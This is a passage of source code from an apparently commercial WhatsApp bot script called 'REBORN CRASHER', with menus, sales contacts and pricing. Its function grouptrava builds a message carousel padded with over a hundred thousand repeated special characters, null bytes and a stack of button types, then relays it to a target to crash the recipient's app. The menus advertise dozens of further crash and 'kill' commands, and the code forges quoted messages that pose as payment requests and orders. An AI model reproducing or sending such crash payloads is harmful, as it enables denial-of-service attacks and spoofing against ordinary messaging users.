body: yutub.title,
mediaType: 1,
previewType: 0,
renderLargerThumbnail: true,
thumbnailUrl: yutub.thumbnail,
sourceUrl: Link
}
}},{ quoted: qmime })
/*} else {
await m.reply(`File audio ( ${bytesToSize(yutub.size)} ), telah melebihi batas maksimum!`)
}*/
} catch (err){
console.log(err)
}}

	// Pengiriman Quoted Fake Live Lokasi //
      const qbugz = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `t.me/justinoffc`,jpegThumbnail: ""}}}
	// Pengiriman Quoted Fake Lokasi Dengan Thumb //
      const qmime = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `JustinOfficial-V15`,jpegThumbnail: await rsz(foto, 200, 200) }}}
	// Pengiriman Quoted Fake Broadcast Gif Dengan Thumb PP Sender //
	const qgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title": 'justinbot', "h": 'justin','seconds': '359996400', 'gifPlayback': 'true', 'caption': 'justinbot', 'jpegThumbnail': ppuser}}}
	// Pengiriman Quoted Fake Live Lokasi V2 //
      const qctc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `sc justinbot by t.me/justinoffc`,jpegThumbnail: ""}}}
	// Pengiriman Quoted Fake Permintaan Bayaran //
        const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso8583: "BRL", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "justinbot | t.me/justinoffc"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 7777, currencyCode: "BRL"}}}}
	// Pengiriman Quoted Fake Produk Troli //
	const qtroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2024,status: 200, thumbnail: ppuser, surface: 200, message: `justinbot`, orderTitle: 't.me/justinoffc', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
    // Pengiriman Fake Audio //
    const qVoice = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}}}
	// Pengiriman Quoted Fake Lokasi Runtime //       
        const qjpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `々 | 🔴 justinbot: ${runtime(process.uptime())}`,jpegThumbnail: ""}}}
	// Pengiriman Quoted Fake Custom Text //
	const qText = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "0@s.whatsapp.net"} : {}) },'message': {extendedTextMessage: {text: "justinbot by t.me/justinoffc"}}}
		
        const nullgb = {
        key: {
            fromMe: false,
            participant: '0@s.whatsapp.net',
            remoteJid: 'status@broadcast'
            },
            message: {
            documentMessage: {
                contactVcard: true
              }
            }
        };
    
 // Random Reply //
 const reply = (teks) => {
            Justinn.sendMessage(m.chat,
{
    text: teks,
    contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `JustinOfficialV15`,
            "body": `Developer JustinOfficial`,
            "previewType": "PHOTO",
            "thumbnailUrl": `youtube.com/@justinofficial-id`,
            "thumbnail": fs.readFileSync('./Justin/marga.jpg'),
            "sourceUrl": `https://whatsapp.com/channel/0029VaxxUio545v2bL3FE91g`
        }
    }
},
{ quoted: qmime })
        }
 
 const xpaytod = (teks) => {
            Justinn.sendMessage(m.chat,
{
    text: teks,
    contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `JustinOfficialV15`,
            "body": `Developer JustinOfficial`,
            "previewType": "PHOTO",
            "thumbnailUrl": `youtube.com/@justinofficial-Id`,
            "thumbnail": fs.readFileSync('./Justin/marga.jpg'),
            "sourceUrl": `https://whatsapp.com/channel/0029VaxxUio545v2bL3FE91g`
        }
    }
},
{ quoted: qmime })
        }
        // const q //
		const sendReact = async (emote) => {
        Justinn.sendMessage(remoteJid, {
          react: {
            text: emote,
            key: m.key,
          },
        })
      }
   
const nomerCreator =
[
'2347019170750@s.whatsapp.net',
'2347019170750@s.whatsapp.net'
]
   
		const qstore = {
   key: {
      fromMe: false,
     participant: `0@s.whatsapp.net`,
   ...(m.chat ? {
         remoteJid: "status@broadcast"
} : {})
}, message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "image/jpeg",
"jpegThumbnail": "",
},
"title": `JustinOfficial - Marketplace`,
"description": null,
"currencyCode": "IDR",
"priceAmount1000": "999999999",
"retailerId": ` Justinnner `,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}}
}

                async function grouptrava(target) {
    const msg = generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: `\0`
                        },
                        carouselMessage: {
                            cards: [
                                {
                                    header: {
                                        ...(await prepareWAMessageMedia(
                                            { image: { url: "https://files.catbox.moe/gx4tm6.jpg" } }, 
                                            { upload: Justinn.waUploadToServer }
                                        )),
                                        title: `\0`,
                                        gifPlayback: true,
                                        subtitle: '\0',
                                        hasMediaAttachment: true
                                    },
                                    body: {
                                        text: `🩸JustinV15 Kill You!!🗡️` + "ꦾ".repeat(120000)
                                    },
                                    footer: {
                                        text: "\0"
                                    },
                                    nativeFlowMessage: {
                                        buttons: [
                                            {
                                                name: "single_select",
                                                buttonParamsJson: JSON.stringify({
                                                    title: "JustinOfficial",
                                                    sections: []
                                                })
                                            },
                                            {
                                                name: "single_select",
                                                buttonParamsJson: `{"title":"${"𑲭𑲭".repeat(60000)}","sections":[{"title":" i wanna be kill you ","rows":[]}]}`
                                            },
                                            {
                                                name: "call_permission_request",
                                                buttonParamsJson: "{}"
                                            },
                                            {
                                                name: "mpm",
                                                buttonParamsJson: "{}"
                                            },
                                            {
                                                name: "single_select",
                                                buttonParamsJson: "{\"title\":\"🦠\",\"sections\":[{\"title\":\"🔥\",\"highlight_label\":\"💥\",\"rows\":[{\"header\":\"\",\"title\":\"💧\",\"id\":\"⚡\"},{\"header\":\"\",\"title\":\"💣\",\"id\":\"✨\"}]}]}"
                                            },
                                            {
                                                name: "quick_reply",
                                                buttonParamsJson: "{\"display_text\":\"Quick Crash Reply\",\"id\":\"📌\"}"
                                            },
                                            {
                                                name: "cta_url",
                                                buttonParamsJson: "{\"display_text\":\"Developed\",\"url\":\"https://www.youtube.com/@justinofficial-id\",\"merchant_url\":\"https://www.youtube.com/@justinofficial-id\"}"
                                            },
                                            {
                                                name: "cta_call",
                                                buttonParamsJson: "{\"display_text\":\"Call Us Null\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "cta_copy",
                                                buttonParamsJson: "{\"display_text\":\"Copy Crash Code\",\"id\":\"message\",\"copy_code\":\"#CRASHCODE9741\"}"
                                            },
                                            {
                                                name: "cta_reminder",
                                                buttonParamsJson: "{\"display_text\":\"Set Reminder Crash\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "cta_cancel_reminder",
                                                buttonParamsJson: "{\"display_text\":\"Cancel Reminder Crash\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "address_message",
                                                buttonParamsJson: "{\"display_text\":\"Send Crash Address\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "send_location",
                                                buttonParamsJson: "\0"
                                            }
                                        ]
                                    }
                                }
                            ],
                            messageVersion: 1,
                        }
                    }
                }
            }
        },
        { quoted: VcardQuoted }
    );
    await Justinn.relayMessage(target, msg.message, {
        messageId: msg.key.id,
    });
}

const locq = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: ` ⽶ `,jpegThumbnail: ""}}}

if (isCmd) {
    console.log(`
${chalk.inverse('Pesan Bro')}  ${chalk.inverse(` ${new Date().toLocaleString()} `)}

${chalk.magenta.bold('╭─ > Dari:')}      ${chalk.green.bold(pushname || 'Unknown')} ${chalk.yellow(`(${m.sender})`)}
${chalk.magenta.bold('├─ > Di:')}        ${chalk.cyan.bold(m.isGroup ? 'Group Chat' : 'Private Chat')} ${chalk.gray(from)}
${chalk.magenta.bold('╰─ > Pesan:')}   ${chalk.white.bold(budy || m.mtype)}

${chalk.greenBright.bold('╭────────────────────────────────────────────╮')}
${chalk.greenBright.bold('│          ＲＥＢＯＲＮ  ＣＲＡＳＨＥＲ              │')}
${chalk.greenBright.bold('╰────────────────────────────────────────────╯')}
    `);
}
//=================================================//
		switch (command) {

 case 'menu': 
 case 'help': 
 case 'xbug': {
let asu = `
→Script : ＲＥＢＯＲＮ  ＣＲＡＳＨＥＲ
→BuyScript : 2347019170750
→Action : t.me/lieangell
→Version : ULTRA 
→Status : Vip Buy Only!


➤  ｢ 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 𝐀𝐊𝐒𝐄𝐒 ｣ 
→Bugmenu
→Storemenu
→Ownermenu
→Developer

「 _CREDIT SCRIPT_ 」
- _Mexican official_
- _NaGI official_
- _Mark Zuckerberg official_
- _METa ai official_
- _Dray official_
- _Crypto Lord 
- _GAB_Dev_
- _GHOST ™_
- _Lieangel ™_
- _BLESSED_
- _ElON MUSK_
- _Daffa Dev Ravage_
- _Alwaysaqio_
- _Paktzy_
-GOD

➤  ｢ 𝐈𝐍𝐅𝐎 𝐔𝐏𝐃𝐀𝐓𝐄 𝐒𝐂𝐑𝐈𝐏𝐓 ｣
https://whatsapp.com/channel/0029Vb0vJyK7YSd47MHot92O
Klik *Button* Jika Ingin Menggunakan Fitur *ＲＥＢＯＲＮ  ＣＲＡＳＨＥＲ*👇🏻
`

Justinn.sendMessage(m.chat, {
  image: justinoffc,
  caption: asu,
  footer: "Developer Mexicanl",
  contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `JustinOfficialV15`,
            "body": `© JustinV15 Vip`,
            "previewType": "PHOTO",
            "thumbnailUrl": `youtube.com/@justinofficial-id`,
            "thumbnail": fs.readFileSync('./Justin/justinoffc.jpg'),
            "sourceUrl": `https://whatsapp.com/channel/0029VaycTF0JkK7A95txZi0d`
        }
    },
 buttons: [
     {
    buttonId: ".bugmenu", 
    buttonText: { 
      displayText: 'Bug Menu' 
    }
  }, {
    buttonId: ".buysc", 
    buttonText: {
      displayText: "Buy Script"
    }
  }
],
  viewOnce: true,
  headerType: 6
}, { quoted: qmime })
}
                break
			case 'bugmenu': {

const ler = `
➤  ｢ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 𝐁𝐎𝐓 ｣ 
→Script : ＲＥＢＯＲＮ  ＣＲＡＳＨＥＲ
→BuyScript : 2347019170750
→Action : t.me/lieangell
→Version : ULTRA 
→Status : Vip Buy Only!

➤｢ 𝐁𝐔𝐂 𝐖𝐀-𝐎𝐑𝐈 ｣
→Crash-ui
→Titan-Attack
→Virus-Blank
→Void-infinity
→Fuck-Blood
→Lotus-Crash
→Valentine-Gift
→XCall-Crash
→Hard-Ware
→Baned-Ch

｢ 𝐁𝐔𝐆 𝐒𝐏𝐄𝐂𝐈𝐀𝐋 ｣
→Special-Forceclose
→Special-Crashmaster
→Special-Invisiblity
→Special-Blankpage
→Special-Attackmode
→Special-Killswitch
→Special-Uioverwrite
→Special-Killsystem
→Special-Overpower
→Special-Chaosmode

➤  ｢ 𝐁𝐔𝐆 𝐒𝐄𝐍𝐃𝐄𝐑 ｣ 
→Hai 
→Salken 
→Dimana 
→Sulap
→Baned-Chanel

➤  ｢ 𝐁𝐔𝐆 𝐆𝐑𝐎𝐔𝐏-ULTRA ｣
→Fuck-gc
→tagall-gc
→Happy-gc
→Baned-Chanel

｢ 𝐁𝐔𝐆 𝐃𝐄𝐒𝐓𝐑𝐔𝐂𝐓𝐈𝐎𝐍 ｣
→Darkness
→Chaos
→Carnage
→Massacre
→Mayhem
→Havoc
→Abolish
→Justin-Hardios
→Justin-Hardblankios
→Justin-Hardattackios
→Justin-Frezeeios
→Justin-Outios
→Justin-Hardcrashios
→Justin-Hardinvisios

「 _CREDIT SCRIPT_ 」
- _Mexican official_
- _NaGI official_
- _Mark Zuckerberg official_
- _METa ai official_
- _Dray official_
- _Crypto Lord 
- _GAB_Dev_
- _GHOST ™_
- _Lieangel ™_
- _BLESSED_
- _ElON MUSK_
- _Daffa Dev Ravage_
- _Alwaysaqio_
- _Paktzy_
-
➤  ｢ 𝐈𝐍𝐅𝐎 𝐔𝐏𝐃𝐀𝐓𝐄 𝐒𝐂𝐑𝐈𝐏𝐓 ｣
https://whatsapp.com/channel/0029VaycTF0JkK7A95txZi0d
Klik *Button* Jika Ingin Menggunakan Fitur *ＲＥＢＯＲＮ  ＣＲＡＳＨＥＲ*👇🏻
`
Justinn.sendMessage(m.chat, {
	image: justinoffc,
  caption: ler,
  footer: "Developer JustinOfficial",
    contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `JustinOfficialV15`,
            "body": `© JustinV15 Vip`,
            "previewType": "PHOTO",
            "thumbnailUrl": `youtube.com/@justinofficial-id`,
            "thumbnail": fs.readFileSync('./Justin/justinoffc.jpg'),
            "sourceUrl": `https://whatsapp.com/channel/0029VaycTF0JkK7A95txZi0d`
        }
    },
buttons: [
    {
    buttonId: ".ownermenu", 
    buttonText: { 
      displayText: 'Owner Menu' 
    }
  }, {
    buttonId: ".buysc", 
    buttonText: {
      displayText: "Buy Script"
    }
  },{
    buttonId: ".menu", 
    buttonText: {
      displayText: "Kembali"
    }
  }
],
viewOnce: true,
  headerType: 6,
}, { quoted: qmime });
    }
break
case 'Fuck-gc': {

const ler = `*[ＲＥＢＯＲＮ  ＣＲＡＳＨＥＲ]* Maintenance!

Fitur Ini Tersedia Pada Fase Update Ke2, Jika Sudah Versi No Button Maka Akan Bisa Digunakan, Join Saluran Bisr Gak Ketinggalan Info Terbaru!

➤  ｢ 𝐈𝐍𝐅𝐎 𝐔𝐏𝐃𝐀𝐓𝐄 𝐒𝐂𝐑𝐈𝐏𝐓 ｣
https://whatsapp.com/channel/0029VaycTF0JkK7A95txZi0d
`
Justinn.sendMessage(m.chat, {
	image: justinoffc,
  caption: ler,
  footer: "Developer Mexican ™",
    contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `ＲＥＢＯＲＮ  ＣＲＡＳＨＥＲ`,
            "body": `© ＲＥＢＯＲＮ  ＣＲＡＳＨＥＲ Vip`,
            "previewType": "PHOTO",
            "thumbnailUrl": `youtube.com/@dtwinz14-id`,
            "thumbnail": fs.readFileSync('./Justin/justinoffc.jpg'),
            "sourceUrl": `https://whatsapp.com/channel/0029Vb0vJyK7YSd47MHot92O`
        }
    },
buttons: [
 {
    buttonId: ".bugmenu", 
    buttonText: { 
      displayText: 'Bug Menu' 
    }
  }, {
    buttonId: ".ownermenu", 
    buttonText: {
      displayText: "Owner Menu"
    }
  },{
    buttonId: ".developer", 
    buttonText: {
      displayText: "Developer"
    }
  }
],
viewOnce: true,
  headerType: 6,
}, { quoted: qmime });
    }
break
case 'tagall-gc': {

const ler = `*[ＲＥＢＯＲＮ  ＣＲＡＳＨＥＲ]* Maintenance!

This feature is available in the 2nd update phase. If you've already updated to the No Button version, you can use it. Join the BISR channel so you don't miss the latest info!"

➤  ｢ 𝐈𝐍𝐅𝐎 𝐔𝐏𝐃𝐀𝐓𝐄 𝐒𝐂𝐑𝐈𝐏𝐓 ｣
https://whatsapp.com/channel/0029VaycTF0JkK7A95txZi0d
`
Justinn.sendMessage(m.chat, {
	image: justinoffc,
  caption: ler,
  footer: "Developer JustinOfficial",
    contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `ＲＥＢＯＲＮ  ＣＲＡＳＨＥＲ`,
            "body": `© ＲＥＢＯＲＮ  ＣＲＡＳＨＥＲ Vip`,
            "previewType": "PHOTO",
            "thumbnailUrl": `youtube.com/@dtwinz14-id`,
            "thumbnail": fs.readFileSync('./Justin/justinoffc.jpg'),
            "sourceUrl": `https://whatsapp.com/channel/0029Vb0vJyK7YSd47MHot92O`
        }
    },
buttons: [
 {
    buttonId: ".bugmenu", 
    buttonText: {
      displayText: "Bug Menu"
    }
  },{
    buttonId: ".ownermenu", 
    buttonText: {
      displayText: "Owner Menu"
    }
  }, {
    buttonId: ".developer", 
    buttonText: { 
      displayText: 'Developer' 
    }
  }, 
],
viewOnce: true,
  headerType: 6,
}, { quoted: qmime });
    }
break

case 'ownermenu': {

const ler = `
→Script : ＲＥＢＯＲＮ  ＣＲＡＳＨＥＲ
→BuyScript : 2347019170750
→Action : t.me/lieangell
→Version : ULTRA 
→Status : Vip Buy Only!


➤  ｢ 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 𝐀𝐊𝐒𝐄𝐒 ｣ 
→Addown
→Addmurbug
→Addgcmurbug
→Delown
→Delmurbug
→Delgcmurbug

➤  ｢ 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 ｣ 
→Stiker
→Tiktok
→Toimage
→Tourl
→Shorturl
→Capcut
→Hentaineko
→R34
→Nsfw
→Brat
→Readviewonce
→Qc
→Joingc
→Antilink
→Welcome

「 _CREDIT SCRIPT_ 」
- _Mexican official_
- _NaGI official_
- _Mark Zuckerberg official_
- _METa ai official_
- _Dray official_
- _Crypto Lord 
- _GAB_Dev_
- _GHOST ™_
- _Lieangel ™_
- _BLESSED_
- _ElON MUSK_
- _Daffa Dev Ravage_
- _Alwaysaqio_
- _Paktzy_
-GOD
➤  ｢ 𝐈𝐍𝐅𝐎 𝐔𝐏𝐃𝐀𝐓𝐄 𝐒𝐂𝐑𝐈𝐏𝐓 ｣
https://whatsapp.com/channel/0029VaycTF0JkK7A95txZi0d
Klik *Button* Jika Ingin Menggunakan Fitur *ＲＥＢＯＲＮ  ＣＲＡＳＨＥＲ*👇🏻
`
Justinn.sendMessage(m.chat, {
	image: justinoffc,
  caption: ler,
  footer: "Developer MEXICANOFFICIAL",
    contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `JustinOfficialV15`,
            "body": `© JustinV15 Vip`,
            "previewType": "PHOTO",
            "thumbnailUrl": `youtube.com/@justinofficial-id`,
            "thumbnail": fs.readFileSync('./Justin/justinoffc.jpg'),
            "sourceUrl": `https://whatsapp.com/channel/0029VaycTF0JkK7A95txZi0d`
        }
    },
buttons: [
 {
    buttonId: ".storemenu", 
    buttonText: {
      displayText: "Store Menu"
    }
  },{
    buttonId: ".bugmenu", 
    buttonText: {
      displayText: "Kembali"
    }
  }, {
    buttonId: ".buysc", 
    buttonText: { 
      displayText: 'Buy Script' 
    }
  }, 
],
viewOnce: true,
  headerType: 6,
}, { quoted: qmime });
    }
break

case 'baned-chanel': {

const ler = `*[ＲＥＢＯＲＮ  ＣＲＡＳＨＥＲ]* Akses Ditolak

Kusus Developer Mexican Ofc

➤  ｢ 𝐈𝐍𝐅𝐎 𝐔𝐏𝐃𝐀𝐓𝐄 𝐒𝐂𝐑𝐈𝐏𝐓 ｣
https://whatsapp.com/channel/0029VaycTF0JkK7A95txZi0d
`
Justinn.sendMessage(m.chat, {
	image: justinoffc,
  caption: ler,
  footer: "Developer JustinOfficial",
    contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `JustinOfficialV15`,
            "body": `© JustinV15 Vip`,
            "previewType": "PHOTO",
            "thumbnailUrl": `youtube.com/@justinofficial-id`,
            "thumbnail": fs.readFileSync('./Justin/justinoffc.jpg'),
            "sourceUrl": `https://whatsapp.com/channel/0029VaycTF0JkK7A95txZi0d`
        }
    },
buttons: [
 {
    buttonId: ".bugmenu", 
    buttonText: { 
      displayText: 'Kembali' 
    }
  }, {
    buttonId: ".tqto", 
    buttonText: {
      displayText: "Team Justin"
    }
  },{
    buttonId: ".buysc", 
    buttonText: {
      displayText: "Buy Script"
    }
  }
],
viewOnce: true,
  headerType: 6,
}, { quoted: qmime });
    }
break

case 'storemenu': {

const ler = `
➤  ｢ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 𝐁𝐎𝐓 ｣ 
→Script : ＲＥＢＯＲＮ  ＣＲＡＳＨＥＲ
→BuyScript : 2347019170750
→Action : t.me/lieangell
→Version : ULTRA 
→Status : Vip Buy Only!


➤  ｢ 𝐒𝐓𝐎𝐑𝐄 𝐌𝐄𝐍𝐔 ｣ 
→Jpm
→Jpm2
→Jpmchfoto
→Jpmtesti
→Jpmallch
→Jpmsaluran
→Jpmhidetag
→Pushkontak
→Pushkontak2
→Savekontak
→Savekontak1
→Antilink
→Tourl
→Done
→Proses
→Tiktok
→Capcut
→Hentaineko
→R34
→Nsfw
→Brat
→Readviewonce
→Qc
→Joingc
→Welcome
→Addich
→Cekidgrup
→Cekidch

「 _CREDIT SCRIPT_ 」
- _Mexican official_
- _NaGI official_
- _Mark Zuckerberg official_
- _METa ai official_
- _Dray official_
- _Crypto Lord 
- _GAB_Dev_
- _GHOST ™_
- _Lieangel ™_
- _BLESSED_
- _ElON MUSK_
- _Daffa Dev Ravage_
- _Alwaysaqio_
- _Paktzy_
-
➤  ｢ 𝐈𝐍𝐅𝐎 𝐔𝐏𝐃𝐀𝐓𝐄 𝐒𝐂𝐑𝐈𝐏𝐓 ｣
https://whatsapp.com/channel/0029VaycTF0JkK7A95txZi0d
Klik *Button* Jika Ingin Menggunakan Fitur *ＲＥＢＯＲＮ  ＣＲＡＳＨＥＲ*👇🏻
`
Justinn.sendMessage(m.chat, {
	image: justinoffc,
  caption: ler,
  footer: "Developer Mexican Official",
    contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `JustinOfficialV15`,
            "body": `© JustinV15 Vip`,
            "previewType": "PHOTO",
            "thumbnailUrl": `youtube.com/@justinofficial-id`,
            "thumbnail": fs.readFileSync('./Justin/justinoffc.jpg'),
            "sourceUrl": `https://whatsapp.com/channel/0029VaycTF0JkK7A95txZi0d`
        }
    },
buttons: [
 {
    buttonId: ".bugmenu", 
    buttonText: { 
      displayText: 'Kembali' 
    }
  }, {
    buttonId: ".buysc", 
    buttonText: {
      displayText: "Buy Script"
    }
  }
],
viewOnce: true,
  headerType: 6,
}, { quoted: qmime });
    }
break

case 'tqto': {

const ler = `
「 _CREDIT SCRIPT_ 」
- _Mexican official_
- _NaGI official_
- _Mark Zuckerberg official_
- _METa ai official_
- _Dray official_
- _Crypto Lord 
- _GAB_Dev_
- _GHOST ™_
- _Lieangel ™_
- _BLESSED_
- _ElON MUSK_
- _Daffa Dev Ravage_
- _Alwaysaqio_
- _Paktzy_
-
➤  ｢ 𝐈𝐍𝐅𝐎 𝐔𝐏𝐃𝐀𝐓𝐄 𝐒𝐂𝐑𝐈𝐏𝐓 ｣
https://whatsapp.com/channel/0029Vb0vJyK7YSd47MHot92O
Klik *Button* Jika Ingin Menggunakan Fitur *REBORN CRASHER*👇🏻
`
Justinn.sendMessage(m.chat, {
	image: justinoffc,
  caption: ler,
  footer: "Developer Mexican Official",
buttons: [
 {
    buttonId: ".menu", 
    buttonText: { 
      displayText: 'Kembali' 
    }
  }, {
    buttonId: ".developer", 
    buttonText: {
      displayText: "Developer"
    }
  }
],
viewOnce: true,
  headerType: 6,
}, { quoted: qmime });
    }
break

case 'Happy-gc': {

const ler = `*[ＲＥＢＯＲＮ  ＣＲＡＳＨＥＲ]* Maintenance!

Fitur Ini Tersedia Pada Fase Update Ke2, Jika Sudah Versi No Button Maka Akan Bisa Digunakan, Join Saluran Biar Gak Ketinggalan Info Terbaru!

➤  ｢ 𝐈𝐍𝐅𝐎 𝐔𝐏𝐃𝐀𝐓𝐄 𝐒𝐂𝐑𝐈𝐏𝐓 ｣
https://whatsapp.com/channel/0029VaycTF0JkK7A95txZi0d
`
Justinn.sendMessage(m.chat, {
	image: justinoffc,
  caption: ler,
  footer: "Developer Mexicanofficiall",
    contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `JustinOfficialV15`,
            "body": `© JustinV15 Vip`,
            "previewType": "PHOTO",
            "thumbnailUrl": `youtube.com/@justinofficial-id`,
            "thumbnail": fs.readFileSync('./Justin/justinoffc.jpg'),
            "sourceUrl": `https://whatsapp.com/channel/0029VaycTF0JkK7A95txZi0d`
        }
    },
buttons: [
 {
    buttonId: ".bugmenu", 
    buttonText: { 
      displayText: 'Bug Menu' 
    }
  }, {
    buttonId: ".buysc", 
    buttonText: {
      displayText: "Buy Script"
    }
  }
],
viewOnce: true,
  headerType: 6,
}, { quoted: qmime });
    }
break

case 'developer': {
    let devnya = `𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫

𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 : wa.me/2347019170750
𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 : wa.me/2347038003702
𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 : t.me/lieangell
𝐒𝐚𝐥𝐮𝐫𝐚𝐧 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 : https://whatsapp.com/channel/0029Vb0vJyK7YSd47MHot92O

> Selain Itu Clone (Penipuan)`
Justinn.sendMessage(m.chat, {
	image: justin,
  caption: devnya,
  footer: "Developer Mexican Official",
    contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `JustinOfficialV15`,
            "body": `© JustinV15 Vip`,
            "previewType": "PHOTO",
            "thumbnailUrl": `youtube.com/@justinofficial-id`,
            "thumbnail": fs.readFileSync('./Justin/justinoffc.jpg'),
            "sourceUrl": `https://whatsapp.com/channel/0029VaycTF0JkK7A95txZi0d`
        }
    }
}, { quoted: qmime });
    }
break

case 'buysc': {
   let scripnya = `
*Contac Admin Mexicanofficial*
𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 : wa.me/2347019170750
𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 : wa.me/2347038003702
𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 : t.me/lieangell
𝐒𝐚𝐥𝐮𝐫𝐚𝐧 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 : https://whatsapp.com/channel/0029Vb0vJyK7YSd47MHot92O

*Harga  ＲＥＢＯＲＮ  ＣＲＡＳＨＥＲ*
Enc 3k
No Enc 5k

Jangan Lupa Join Saluran, Agar Tidak Ketinggalan Info Update Script Terbaru
https://whatsapp.com/channel/0029Vb0vJyK7YSd47MHot92O

Justinn.sendMessage(m.chat, {
	image: justinoffc,
  caption: scripnya,
  footer: "Developer JustinOfficial",
    contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `JustinOfficialV15`,
            "body": `© JustinV15 Vip`,
            "previewType": "PHOTO",
            "thumbnailUrl": `youtube.com/@justinofficial-id`,
            "thumbnail": fs.readFileSync('./Justin/justinoffc.jpg'),
            "sourceUrl": `https://whatsapp.com/channel/0029VaxxUio545v2bL3FE91g`
        }
    }
}, { quoted: qmime });
    }
break
//======================[ JB MENU ]===================================================================//

case "prss": case "proses": {
if (!text) return m.reply('*[V15 Notice]* Format Salah! Contoh: .proses Nama Barang, Harga, Via Pembayaran');
        const args = text.split(',');
        if (args.length < 3) return m.reply('*[V15 Notice]* Pastikan Formatnya Sesuai! Contoh: .proses Nama Barang, Harga, Via Pembayaran');

        const [namaBarang, harga, viaPembayaran] = args.map(arg => arg.trim());

        // Tanggal otomatis
        const currentDate = new Date();
        const options = { timeZone: 'Asia/Jakarta', year: 'numeric', month: 'long', day: 'numeric' };
        const formattedDate = currentDate.toLocaleDateString('id-ID', options);
const fler = {
text: `*MEMPROSES TRANSAKSI*
📦 PRODUK : *${namaBarang}*
📤 HARGA : *Rp ${harga}.000*
📆 TANGGAL  : *${formattedDate}*

*TERIMAKASIH ATAS KEPERCAYAAN NYA*`
}
await Justinn.sendMessage(m.chat, fler, {quoted: qlocPay})
}
break

case 'dne': case 'done': {
if (!text) return m.reply('*[V15 Notice]* Format Salah! Contoh: .done Nama Barang, Harga, Via Pembayaran');
        const args = text.split(',');
        if (args.length < 3) return m.reply('*[V15 Notice]* Pastikan Formatnya Sesuai! Contoh: .done Nama Barang Harga Via Pembayaran');

